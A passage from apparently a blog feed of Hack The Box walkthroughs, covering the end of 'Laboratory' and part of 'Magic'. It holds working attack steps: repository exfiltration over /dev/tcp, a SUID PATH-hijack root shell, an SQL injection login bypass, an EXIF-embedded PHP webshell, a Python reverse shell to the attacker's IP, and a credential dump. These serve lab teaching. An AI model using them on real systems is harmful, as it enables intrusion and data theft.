</span></span><span class="line"><span class="cl">drwxr-s---  <span class="m">6</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> .
</span></span><span class="line"><span class="cl">drwxr-s---  <span class="m">4</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> ..
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> git root   <span class="m">23</span> Jul  <span class="m">5</span>  <span class="m">2020</span> HEAD
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> git root  <span class="m">107</span> Jul  <span class="m">5</span>  <span class="m">2020</span> config
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> git root   <span class="m">73</span> Jul  <span class="m">5</span>  <span class="m">2020</span> description
</span></span><span class="line"><span class="cl">drwxr-sr-x  <span class="m">2</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> hooks
</span></span><span class="line"><span class="cl">drwxr-sr-x  <span class="m">2</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> info
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> git root  <span class="m">112</span> Jul  <span class="m">5</span>  <span class="m">2020</span> language-stats.cache
</span></span><span class="line"><span class="cl">drwxr-sr-x <span class="m">14</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> objects
</span></span><span class="line"><span class="cl">drwxr-sr-x  <span class="m">4</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> refs
</span></span></code></pre></div><p>First, I’ll create a tarball archive of that repository and I’ll name it as <code>exfil-securedocker-git.tar</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@git:~/git-data/repositories/@hashed/19/58/$ tar -czf /tmp/exfil-securedocker-git.tar 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
</span></span></code></pre></div><p>On my machine, I&rsquo;ll setup a listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span> &gt; exfil-securedocker-git.tar
</span></span></code></pre></div><p>Back on Laboratory, I’ll send the repository  tarball to my machine using <code>cat</code> and <code>bash</code> trick</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@git:~/git-data/repositories/@hashed/19/58/$ cat /tmp/exfil-securedocker-git.tar &gt; /dev/tcp/10.10.14.39/9000
</span></span></code></pre></div><p>My listener received the tarball.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span> &gt; exfil-securedocker-git.tar
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.39<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.216<span class="o">]</span> <span class="m">42426</span>
</span></span></code></pre></div><h4 id="recovering-securedocker-repository">Recovering &lsquo;securedocker&rsquo; repository</h4>
<p>After extracting the repository,  <code>git:(master)</code> popped up in my zsh prompt which indicates this is a git repository.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ tar -xzf exfil-securedocker-git.tar
</span></span><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> 19581e27de7ced....5ef03f7c3017bb5b7.git
</span></span><span class="line"><span class="cl">→ root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ 
</span></span></code></pre></div><p>But, when I try to read the repository status, it returns the following errors.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ git status
</span></span><span class="line"><span class="cl">fatal: this operation must be run in a work tree
</span></span></code></pre></div><blockquote>
<p>I&rsquo;ve renamed <code>19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git</code> to <code>secure-docker.git</code>.</p>
</blockquote>
<p>This problem can be resolved by creating a new <code>.git</code> folder within <code>secure-docker.git</code> and transferring all the files from <code>secure-docker.git</code> to the newly created <code>.git</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ mkdir .git
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ mv * .git
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ git status
</span></span><span class="line"><span class="cl">fatal: this operation must be run in a work tree
</span></span></code></pre></div><p>Finally, use the <code>git init</code> command to re-initialize the git repository.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ git init
</span></span><span class="line"><span class="cl">Reinitialized existing Git repository in /root/htb/to-do/laboratory/loot/secure-docker.git/.git/
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ git status
</span></span><span class="line"><span class="cl">On branch master
</span></span><span class="line"><span class="cl">Changes to be committed:
</span></span><span class="line"><span class="cl">  <span class="o">(</span>use <span class="s2">&#34;git restore --staged &lt;file&gt;...&#34;</span> to unstage<span class="o">)</span>
</span></span><span class="line"><span class="cl">        deleted:    README.md
</span></span><span class="line"><span class="cl">        deleted:    create_gitlab.sh
</span></span><span class="line"><span class="cl">        deleted:    dexter/.ssh/authorized_keys
</span></span><span class="line"><span class="cl">        deleted:    dexter/.ssh/id_rsa
</span></span><span class="line"><span class="cl">        deleted:    dexter/recipe.url
</span></span><span class="line"><span class="cl">        deleted:    dexter/todo.txt
</span></span></code></pre></div><p>This repository contains a set of SSH keys that have been deleted. I can restore these with <code>git checkout --</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ git checkout --
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">20</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 09:36 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 09:36 ..
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root  <span class="m">102</span> Mar <span class="m">22</span> 09:36 recipe.url
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 09:36 .ssh
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root  <span class="m">160</span> Mar <span class="m">22</span> 09:36 todo.txt
</span></span></code></pre></div><h4 id="ssh---dexter">SSH - dexter</h4>
<p>I can now login as <code>dexter</code> using the SSH key I obtained.</p>
<p>At first try, it says the key is invalid format, but this can be fixed wit by adding an empty string (newline) using the <code>echo</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ chmod <span class="m">600</span> dexter/.ssh/id_rsa
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ ssh -i dexter/.ssh/id_rsa dexter@10.10.10.216
</span></span><span class="line"><span class="cl">Load key <span class="s2">&#34;id_rsa&#34;</span>: invalid format
</span></span><span class="line"><span class="cl">dexter@10.10.10.216: Permission denied <span class="o">(</span>publickey<span class="o">)</span>.
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;&#39;</span> &gt;&gt; dexter/.ssh/id_rsa
</span></span></code></pre></div><p>Now it logs me in.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ ssh -i id_rsa dexter@10.10.10.216
</span></span><span class="line"><span class="cl">dexter@laboratory:~$
</span></span><span class="line"><span class="cl">dexter@laboratory:~$ id<span class="p">;</span>hostname
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span>
</span></span><span class="line"><span class="cl">laboratory
</span></span><span class="line"><span class="cl">dexter@laboratory:~$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">-r--r----- <span class="m">1</span> root dexter <span class="m">33</span> Mar <span class="m">22</span> 10:06 user.txt
</span></span></code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>The contents of <code>todo.txt</code> talks something about “docker security”, but I have no idea what it is except it uses three hashtags.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ cat dexter/todo.txt
</span></span><span class="line"><span class="cl"><span class="c1"># DONE: Secure docker for regular users</span>
</span></span><span class="line"><span class="cl"><span class="c1">### DONE: Automate docker security on startup</span>
</span></span><span class="line"><span class="cl"><span class="c1"># TODO: Look into &#34;docker compose&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># TODO: Permanently ban DeeDee from lab#</span>
</span></span></code></pre></div><p>It turns out it’s a binary name which has a SUID bit set found by Linpeas.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> SUID - Check easy privesc, exploits and write perms                                                                                
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root   dexter           17K Aug <span class="m">28</span>  <span class="m">2020</span> /usr/local/bin/docker-security
</span></span></code></pre></div><p>Inspecting the binary with the <code>ltrace</code> command reveals that it uses relative path to call <code>chmod</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dexter@laboratory:~$ ltrace docker-security 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">setuid<span class="o">(</span>0<span class="o">)</span>                                                                                                <span class="o">=</span> -1
</span></span><span class="line"><span class="cl">setgid<span class="o">(</span>0<span class="o">)</span>                                                                                                <span class="o">=</span> -1
</span></span><span class="line"><span class="cl">system<span class="o">(</span><span class="s2">&#34;chmod 700 /usr/bin/docker&#34;</span>chmod: changing permissions of <span class="s1">&#39;/usr/bin/docker&#39;</span>: Operation not permitted
</span></span><span class="line"><span class="cl"> &lt;no <span class="k">return</span> ...&gt;
</span></span><span class="line"><span class="cl">--- SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> ---
</span></span><span class="line"><span class="cl">&lt;... system resumed&gt; <span class="o">)</span>                                                                                   <span class="o">=</span> <span class="m">256</span>
</span></span><span class="line"><span class="cl">system<span class="o">(</span><span class="s2">&#34;chmod 660 /var/run/docker.sock&#34;</span>chmod: changing permissions of <span class="s1">&#39;/var/run/docker.sock&#39;</span>: Operation not permitted
</span></span><span class="line"><span class="cl"> &lt;no <span class="k">return</span> ...&gt;
</span></span><span class="line"><span class="cl">--- SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> ---
</span></span><span class="line"><span class="cl">&lt;... system resumed&gt; <span class="o">)</span>                                                                                   <span class="o">=</span> <span class="m">256</span>
</span></span><span class="line"><span class="cl">+++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
</span></span></code></pre></div><p>Knowing this, I could hijack the execution path.</p>
<h4 id="suid---path-hijack">SUID - Path Hijack</h4>
<p>First, I&rsquo;ll create a fake <code>chmod</code> that calls <code>bash</code> binary at <code>/dev/shm</code>, I&rsquo;ll also add an execute permission on that file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dexter@laboratory:~$ <span class="nb">cd</span> /dev/shm
</span></span><span class="line"><span class="cl">dexter@laboratory:/dev/shm$ <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash\n/bin/bash&#39;</span> &gt; chmod
</span></span><span class="line"><span class="cl">dexter@laboratory:/dev/shm$ /bin/chmod +x chmod
</span></span></code></pre></div><p>Next, I&rsquo;ll add current directory (<code>/dev/shm</code>) to <code>$PATH</code> variable. Now if I call <code>chmod</code>, it points to my <code>chmod</code> on <code>/dev/shm</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dexter@laboratory:/dev/shm$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>:<span class="nv">$PATH</span>
</span></span><span class="line"><span class="cl">dexter@laboratory:/dev/shm$ which chmod
</span></span><span class="line"><span class="cl">/dev/shm/chmod
</span></span></code></pre></div><p>And now I can just execute <code>docker-security</code> to obtain a root access as well as the root flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dexter@laboratory:/dev/shm$ docker-security 
</span></span><span class="line"><span class="cl">root@laboratory:/dev/shm#
</span></span><span class="line"><span class="cl">root@laboratory:/dev/shm# cut -c6- /root/root.txt 
</span></span><span class="line"><span class="cl">9f593f335a0a1f403c753719eb6
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Magic</title>
      <link>https://fahmifj.github.io/hackthebox/magic/</link>
      <pubDate>Fri, 09 Apr 2021 13:32:05 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/magic/</guid>
      <description>SQLi for login bypass and embed webshell to an image file</description>
      <content:encoded><![CDATA[<p>Magic from Hack The Box features a PHP-based web application which is vulnerable to SQL injection for login bypass. The file upload feature fails to validate an image uploaded to it. This allows me to upload a webshell embedded image and gain a foothold. Enumerating the systems discovers database credentials which leads to database dump and obtain user credentials. For the root part, there&rsquo;s a SUID binary that&rsquo;s vulnerable to the path hijack attack since it calls some binaries without their absolute path.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>SQL injection</li>
<li>Bypassing file upload filter</li>
<li>SUID exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>Exiftool - <a href="https://exiftool.org/">https://exiftool.org/</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «magic» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ nmap -sC -sV -oA scans/magic 10.10.10.185
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Magic Portfolio
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p><code>nmap</code> found two ports open, an HTTP service on port 80 and SSH service on port 22</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80  -  Website</h3>
<p>The home page shows a bunch of images.</p>
<img src="imgs/image-20210413132328926.png" alt="image-20210413132328926" style="zoom:80%;" />
<p>By clicking &ldquo;Views image&rdquo;, I know some images located on <code>/images/uploads</code> and some others on <code>/images/fulls</code>. At the bottom page, there&rsquo;s a login button that points to <code>/login.php</code></p>
<img src="imgs/image-20210412052815532.png" alt="image-20210412052815532" style="zoom: 80%;" />
<p>Common credentials don&rsquo;t seem to work here.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="sql-injection---login-bypass-on-loginphp">SQL injection - Login bypass on <code>/login.php</code></h4>
<blockquote>
<p>The login form doesn&rsquo;t allows spacing between character, but it can be tricked by copy and paste.</p>
</blockquote>
<p>A basic sql injection technique <code>' or 1 = 1 -- - </code>  to bypass login is work against the login page.</p>
<blockquote>
<p>In MySQL, a space after a comment is a must <code>-- [space]</code>, because of that I added <code>-- -</code> to make it clear.</p>
</blockquote>
<p>We can assume the back-end query would look like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="p">...</span><span class="o">&lt;</span><span class="k">some</span><span class="w"> </span><span class="n">php</span><span class="o">&gt;</span><span class="p">...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">$</span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">$</span><span class="n">pwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">...</span><span class="o">&lt;</span><span class="k">some</span><span class="w"> </span><span class="n">php</span><span class="o">&gt;</span><span class="p">...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">table</span><span class="p">.</span><span class="k">user</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;$username&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;$pwd&#39;</span><span class="w">
</span></span></span></code></pre></div><p>If I assign <code>' or 1 = 1 -- - </code> as value of <code>$username</code>, it becomes:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">table</span><span class="p">.</span><span class="k">user</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="c1">-- -&#39; and password=&#39;$pwd&#39;
</span></span></span></code></pre></div><h4 id="upload-filter-bypass">Upload filter bypass</h4>
<p>Upon a successful login, the site redirects me to <code>/upload.php</code>. It shows up with an upload form. It only accepts a valid image file.</p>
<img src="imgs/image-20210413153556151.png" alt="image-20210413153556151" style="zoom:80%;" />
<p>After some testing, I can bypass this upload filter by embedding my php shell on an image file (I took it from the web itself). This can be done by using <code>exiftool</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «forest» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ ./exiftool -Comment<span class="o">=</span><span class="s1">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> iamf.jpg
</span></span></code></pre></div><p>Next, I added <code>.php</code> extension right before the image extension (in my case it is <code>.jpg</code>, so it becomes <code>filename.php.jpg</code>).</p>
<p>Back to <code>/upload.php</code>, now it accepts my malicious image.</p>
<img src="imgs/image-20210413153504323.png" alt="image-20210413153504323" style="zoom:80%;" />
<p>I can find the uploaded file at <code>http://htb.magic/images/uploads/</code>.</p>
<p>When I visit <code>http://htb.magic/images/uploads/iamf.php.jpg?cmd=pwd</code>, I can see the code execution is working</p>
<img src="https://cdn-images-1.medium.com/max/1000/1*WJEvgyrM5UmXULt8uBhu3A.png" alt="img" style="zoom:80%;" />
<h4 id="shell-access">Shell access</h4>
<p>The machine has Python3 installed. With that, I can send a Python one liner reverse shell and set up a listener on port 443 to gain a foothold on the system.</p>
<p>I&rsquo;ll enter this URL on the browser.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">http://htb.magic/images/uploads/iamf.php.jpg?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.169%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27&#34;
</span></span></span></code></pre></div><p>When I check my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «magic» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">443</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.169<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.185<span class="o">]</span> <span class="m">19448</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1327<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-theseus">Shell as theseus</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>There is a database configuration, <code>db.php5</code>, that stores database credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ find . -type f -user www-data
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">./var/www/Magic/db.php5
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><img src="imgs/image-20210413153535228.png" alt="image-20210413153535228" style="zoom:80%;" />
<h4 id="database-dump">Database dump</h4>
<p>I can use <code>netstat</code> to confirm that the MySQL server is currently running.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@ubuntu:/var/www/Magic$ netstat -tlpn
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">tcp		0		<span class="m">0</span>   127.0.0.1:3306           0.0.0.0:*              LISTEN       -
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>Unfortunately, the <code>mysql</code> binary is not present in this box.</p>
<img src="imgs/image-20210413153425371.png" alt="image-20210413153425371"  />
<p>But, I could use <code>mysqldump</code> to dump the database, and it contains another credentials: <code>admin:Th3s3usW4sK1ng</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@ubuntu:/var/www/Magic$ mysqldump Magic -u theseus -p<span class="s1">&#39;iamkingtheseus&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">LOCK TABLES <span class="sb">`</span>login<span class="sb">`</span> WRITE<span class="p">;</span>
</span></span><span class="line"><span class="cl">/*!40000 ALTER TABLE <span class="sb">`</span>login<span class="sb">`</span> DISABLE KEYS */<span class="p">;</span>
</span></span><span class="line"><span class="cl">INSERT INTO <span class="sb">`</span>login<span class="sb">`</span> VALUES <span class="o">(</span>1,<span class="s1">&#39;admin&#39;</span>,<span class="s1">&#39;Th3s3usW4sK1ng&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">/*!40000 ALTER TABLE <span class="sb">`</span>login<span class="sb">`</span> ENABLE KEYS */<span class="p">;</span>
</span></span><span class="line"><span class="cl">UNLOCK TABLES<span class="p">;</span>                                           
</span></span><span class="line"><span class="cl">/*!40103 SET <span class="nv">TIME_ZONE</span><span class="o">=</span>@OLD_TIME_ZONE */<span class="p">;</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><h4 id="shell-upgrade-to-ssh">Shell upgrade to SSH</h4>
<p>It turns out that the password <code>Th3s3usW4sK1ng</code> is reused by user <strong>theseus</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@ubuntu:/var/www/Magic$ su theseus
</span></span><span class="line"><span class="cl">Password: 
</span></span><span class="line"><span class="cl">theseus@ubuntu:/var/www/Magic$
</span></span></code></pre></div><p>Before enumeration, I would like to switch to SSH. First, I&rsquo;ll generate a new SSH key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «magic» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ ssh-keygen -f theseus 
</span></span></code></pre></div><p>Then, I&rsquo;ll add the newly generated public key to <strong>theseus</strong>&rsquo;s <code>authorized_keys</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">theseus@ubuntu:~/.ssh$ <span class="nb">echo</span> <span class="s1">&#39;ssh-rsa AAABBBCCCDDD&#39;</span> &gt;&gt; authorized_keys
